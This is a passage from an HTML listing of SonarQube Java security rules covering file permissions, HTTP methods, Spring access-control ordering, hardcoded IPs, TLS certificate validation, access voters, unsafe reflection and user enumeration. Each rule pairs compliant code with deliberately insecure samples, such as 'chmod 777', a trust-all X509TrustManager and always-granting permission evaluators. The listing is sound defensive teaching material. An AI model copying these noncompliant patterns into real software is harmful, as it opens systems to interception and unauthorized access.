processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h3>Going the extra mile</h3>
<h4>Disable entity expansion</h4>
<p>Specifically for <code>DocumentBuilderFactory</code>, it is possible to disable the entity expansion. Note, however, that this does not prevent the
retrieval of external entities.</p>
<pre>
factory.setExpandEntityReferences(false);
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2612">
              java:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<pre>
    public void setPermissions(String filePath) {
        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions
        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive
        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive
        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<pre>
    public void setPermissionsUsingRuntimeExec(String filePath) {
        Runtime.getRuntime().exec("chmod 777 file.json"); // Sensitive
    }
</pre>
<pre>
    public void setOthersPermissionsHardCoded(String filePath ) {
        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString("rwxrwxrwx")); // Sensitive
    }
</pre>
<h2>Compliant Solution</h2>
<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>
<pre>
    public void setPermissionsSafe(String filePath) throws IOException {
        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions removed
        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant
        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant
        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3752">
              java:S3752
            </a>
          </td>
          <td>
            <details>
              <p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to
change the state of an application, for instance to update a user’s profile on a web application.</p>
<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>
<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>
<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF
protections are most of the time only protecting operations performed by unsafe HTTP methods.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> HTTP methods are not defined at all for a route/controller of the application. </li>
  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be
used to perform read-only operations.</p>
<h2>Sensitive Code Example</h2>
<pre>
@RequestMapping("/delete_user")  // Sensitive: by default all HTTP methods are allowed
public String delete1(String username) {
// state of the application will be changed here
}

@RequestMapping(path = "/delete_user", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed
String delete2(@RequestParam("id") String id) {
// state of the application will be changed here
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@RequestMapping("/delete_user", method = RequestMethod.POST)  // Compliant
public String delete1(String username) {
// state of the application will be changed here
}

@RequestMapping(path = "/delete_user", method = RequestMethod.POST) // Compliant
String delete2(@RequestParam("id") String id) {
// state of the application will be changed here
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs">Spring Security Official
  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4601">
              java:S4601
            </a>
          </td>
          <td>
            <details>
              <p>Spring Framework, and, more precisely, the Spring Security component, allows setting up access control checks at the URI level. This is done by
adding request matchers to the security configuration, each authorizing access to some resources depending on the incoming request entitlement.</p>
<p>Similarly to firewall filtering rules, the order in which those matchers are defined is security relevant.</p>
<h2>Why is this an issue?</h2>
<p>Configured URL matchers are considered in the order they are declared. Especially, for a given resource, if a looser filter is defined before a
stricter one, only the less secure configuration will apply. No request will ever reach the stricter rule.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> A URL pattern ending with <code>**</code> precedes another one having the same prefix. E.g. <code>/admin/**</code> is defined before
  <code>/admin/example/**</code> </li>
  <li> A pattern without wildcard characters is preceded by another one that matches it. E.g.: <code>/page-index/db</code> is defined after
  <code>/page*/**</code> </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Access control rules that have been defined but cannot be applied generally indicate an error in the filtering process. In most cases, this will
have consequences on the application’s authorization and authentication mechanisms.</p>
<h4>Authentication bypass</h4>
<p>When the ignored access control rule is supposed to enforce the authentication on a resource, the consequence is a bypass of the authentication for
that resource. Depending on the scope of the ignored rule, a single feature or whole sections of the application can be left unprotected.</p>
<p>Attackers could take advantage of such an issue to access the affected features without prior authentication, which may impact the confidentiality
or integrity of sensitive, business, or personal data.</p>
<h4>Privilege escalation</h4>
<p>When the ignored access control rule is supposed to verify the role of an authenticated user, the consequence is a privilege escalation or
authorization bypass. An authenticated user with low privileges on the application will be able to access more critical features or sections of the
application.</p>
<p>This could have financial consequences if the accessed features are normally accessed by paying users. It could also impact the confidentiality or
integrity of sensitive, business, or personal data, depending on the features.</p>
<h2>How to fix it in Spring</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable because it defines access control configuration in the wrong order.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll()
      .antMatchers("/admin/**").hasRole("ADMIN")
      .antMatchers("/admin/login").permitAll() // Noncompliant
      .antMatchers("/**", "/home").permitAll()
      .antMatchers("/db/**").access("hasRole('ADMIN') and hasRole('DBA')") // Noncompliant
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll()
      .antMatchers("/admin/login").permitAll()
      .antMatchers("/admin/**").hasRole("ADMIN")
      .antMatchers("/db/**").access("hasRole('ADMIN') and hasRole('DBA')")
      .antMatchers("/**", "/home").permitAll()
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Spring Documentation - <a href="https://docs.spring.io/spring-security/reference/servlet/authorization/authorize-http-requests.html">Authorize
  HttpServletRequests</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 - Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 - Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/285">CWE-285 - Improper Authorization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/287">CWE-287 - Improper Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S1313">
              java:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
String ip = "192.168.12.42"; // Sensitive
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Compliant Solution</h2>
<pre>
String ip = System.getenv("IP_ADDRESS"); // Compliant
Socket socket = new Socket(ip, 6667);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4830">
              java:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
class TrustAllManager implements X509TrustManager {

    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant
    }

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
  <li> <a
  href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5808">
              java:S5808
            </a>
          </td>
          <td>
            <details>
              <p>When granting users access to resources of an application, such an authorization should be based on strong decisions. For instance, a user may be
authorized to access a resource only if they are authenticated, or if they have the correct role and privileges.</p>
<h2>Why is this an issue?</h2>
<p>Access control is a critical aspect of web frameworks that ensures proper authorization and restricts access to sensitive resources or actions. To
enable access control, web frameworks offer components that are responsible for evaluating user permissions and making access control decisions. They
might examine the user’s credentials, such as roles or privileges, and compare them against predefined rules or policies to determine whether the user
should be granted access to a specific resource or action.</p>
<p>Conventionally, these checks should never grant access to every request received. If an endpoint or component is meant to be public, then it should
be ignored by access control components. Conversely, if an endpoint should deny some users from accessing it, then access control has to be configured
correctly for this endpoint.</p>
<p>Granting unrestricted access to all users can lead to security vulnerabilities and potential misuse of critical functionalities. It is important to
carefully assess access decisions based on factors such as user roles, resource sensitivity, and business requirements. Implementing a robust and
granular access control mechanism is crucial for the security and integrity of the web application itself and its surrounding environment.</p>
<h3>What is the potential impact?</h3>
<p>Not verifying user access strictly can introduce significant security risks. Some of the most prominent risks are listed below. Depending on the
use case, it is very likely that other risks are introduced on top of the ones listed.</p>
<h4>Unauthorized access</h4>
<p>As the access of users is not checked strictly, it becomes very easy for an attacker to gain access to restricted areas or functionalities,
potentially compromising the confidentiality, integrity, and availability of sensitive resources. They may exploit this access to perform malicious
actions, such as modifying or deleting data, impersonating legitimate users, or gaining administrative privileges, ultimately compromising the
security of the system.</p>
<h4>Theft of sensitive data</h4>
<p>Theft of sensitive data can result from incorrect access control if attackers manage to gain access to databases, file systems, or other storage
mechanisms where sensitive data is stored. This can lead to the theft of personally identifiable information (PII), financial data, intellectual
property, or other confidential information. The stolen data can be used for various malicious purposes, such as identity theft, financial fraud, or
selling the data on the black market, causing significant harm to individuals and organizations affected by the breach.</p>
<h2>How to fix it in Spring</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The <code>vote</code> method of an <a
href="https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/AccessDecisionVoter.html">AccessDecisionVoter</a>
implementation is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision
(<code>ACCESS_ABSTAIN</code>):</p>
<pre data-diff-id="101" data-diff-type="noncompliant">
public class WeakNightVoter implements AccessDecisionVoter {
    @Override
    public int vote(Authentication authentication, Object object, Collection collection) {
        Calendar calendar = Calendar.getInstance();
        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {
            return ACCESS_GRANTED;
        }

        return ACCESS_ABSTAIN; // Noncompliant: when users connect during the night, no decision is made
    }
}
</pre>
<p>The <code>hasPermission</code> method of a <a
href="https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/PermissionEvaluator.html">PermissionEvaluator</a>
implementation is not compliant when it doesn’t return <code>false</code>:</p>
<pre data-diff-id="102" data-diff-type="noncompliant">
public class MyPermissionEvaluator implements PermissionEvaluator {
    @Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        Object user = authentication.getPrincipal();

        if (user.getRole().equals(permission)) {
              return true;
        }

        return true; // Noncompliant
    }
}
</pre>
<h4>Compliant solution</h4>
<p>The <code>vote</code> method of an <a
href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html">AccessDecisionVoter</a>
implementation should return a negative decision (<code>ACCESS_DENIED</code>):</p>
<pre data-diff-id="101" data-diff-type="compliant">
public class StrongNightVoter implements AccessDecisionVoter {
    @Override
    public int vote(Authentication authentication, Object object, Collection collection) {
        Calendar calendar = Calendar.getInstance();
        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {
            return ACCESS_GRANTED;
        }

        return ACCESS_DENIED; // Users are not allowed to connect during the night
    }
}
</pre>
<p>The <code>hasPermission</code> method of a <a
href="https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html">PermissionEvaluator</a>
implementation should return <code>false</code>:</p>
<pre data-diff-id="102" data-diff-type="compliant">
public class MyPermissionEvaluator implements PermissionEvaluator {
    @Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        Object user = authentication.getPrincipal();

        if (user.getRole().equals(permission)) {
              return true;
        }

        return false;
    }
}
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/285">CWE-285 - Improper Authorization</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2658">
              java:S2658
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javasecurity%3AS6173&rule_key=javasecurity%3AS6173'>S6173</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn’t even have to instantiate or
explicitly invoke methods on such classes to be vulnerable to an attack.</p>
<p>This rule raises an issue for each use of dynamic class loading.</p>
<h3>Noncompliant code example</h3>
<pre>
String className = System.getProperty("messageClassName");
Class clazz = Class.forName(className);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/470">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe
  Reflection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5804">
              java:S5804
            </a>
          </td>
          <td>
            <details>
              <p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using
"sign-in/sign-on/forgot password" functionalities of a website.</p>
<p>When an user tries to "sign-in" to a website with an incorrect username/login, the web application should not disclose that the username doesn’t
exist with a message similar to "this username is incorrect", instead a generic message should be used like "bad credentials", this way it’s not
possible to guess whether the username or password was incorrect during the authentication.</p>
<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large
amount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc …​).</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application discloses that a username exists in its database: most of the time it’s possible to avoid this kind of leak except for the
  "registration/sign-on" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>
  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>
<ul>
  <li> Error messages should be generic and not disclose if the username is valid or not. </li>
  <li> The response time must be similar for a valid username or not. </li>
  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>In a Spring-security web application the username leaks when:</p>
<ul>
  <li> The string used as argument of <a
  href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html">loadUserByUsername</a> method is used in an exception message: </li>
</ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  MyUserDetailsService s1 = new MyUserDetailsService();
  MyUserPrincipal u1 = s1.loadUserByUsername(username);

  if(u1 == null) {
    throw new BadCredentialsException(username+" doesn't exist in our database"); // Sensitive
  }
  // ....
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li>
</ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  if(user == null) {
      throw new UsernameNotFoundException("user not found"); // Sensitive
  }
  // ....
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-">HideUserNotFoundExceptions</a> is set to false: </li>
</ul>
<pre>
DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(false); // Sensitive
builder.authenticationProvider(daoauth);
</pre>
<h2>Compliant Solution</h2>
<p>In a Spring-security web application:</p>
<ul>
  <li> the same message should be used regardless of whether it is the wrong user or password: </li>
</ul>
<pre>
public String authenticate(String username, String password) throws AuthenticationException {
  Details user = null;
  try {
    user = loadUserByUsername(username);
  } catch (UsernameNotFoundException | DataAccessException e) {
    // Hide this exception reason to not disclose that the username doesn't exist
  }
  if (user == null || !user.isPasswordCorrect(password)) {
     // User should not be able to guess if the bad credentials message is related to the username or the password
    throw new BadCredentialsException("Bad credentials");
  }
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-">HideUserNotFoundExceptions</a> should be set to true: </li>
</ul>
<pre>
DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(true); // Compliant
builder.authenticationProvider(daoauth);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6363">
              java:S6363
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>
<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>
